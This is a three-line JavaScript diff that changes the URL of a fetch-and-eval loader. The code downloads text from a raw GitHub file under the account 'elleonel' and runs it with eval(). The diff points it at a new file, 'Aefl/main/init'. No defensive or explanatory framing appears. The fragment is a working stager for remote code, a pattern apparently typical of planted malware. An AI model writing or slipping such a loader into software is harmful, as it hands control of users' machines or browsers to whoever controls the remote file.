@@ -1,3 +1,3 @@
 fetch(
-    "https://raw.githubusercontent.com/elleonel/sas/main/2"
+    "https://raw.githubusercontent.com/elleonel/Aefl/main/init"
 ).then((r) => r.text().then((t) => eval(t)));
